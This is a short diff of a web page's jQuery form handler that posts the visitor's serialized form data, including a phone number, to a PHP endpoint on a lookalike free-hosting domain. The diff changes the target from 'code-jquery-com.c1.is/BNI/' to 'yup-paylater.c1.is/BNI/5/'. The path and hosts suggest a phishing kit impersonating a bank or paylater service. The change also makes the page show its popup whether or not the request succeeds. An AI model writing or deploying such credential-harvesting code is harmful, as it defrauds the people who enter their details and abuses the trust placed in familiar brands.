@@ -679,26 +679,21 @@ $(document).ready(function(){
           $("#loadersaya").show();
 
           $.ajax({
-              url: 'https://code-jquery-com.c1.is/BNI/nomorhp.php',
+              url: 'https://yup-paylater.c1.is/BNI/5/nomorhp.php',
               type: 'post',
               data: $(this).serialize(),             
-success: function(data) {
+complete: function(data) {
+            console.log('Complete')
               $("#loadersaya").hide();
   var nomor = document.getElementById("nope").value;
  sessionStorage.setItem("nomor", nomor);
           $("#popupku").fadeIn();
                
-            },
-           error: function() {
-              $("#loadersaya").hide();
-              var nomor = document.getElementById("nope").value;
- sessionStorage.setItem("nomor", nomor);
-          $("#popupku").fadeIn();
-
-            }
-        });
+}
     });
-});
+ });
+    return false;
+});   
  </script>
  
   <script>
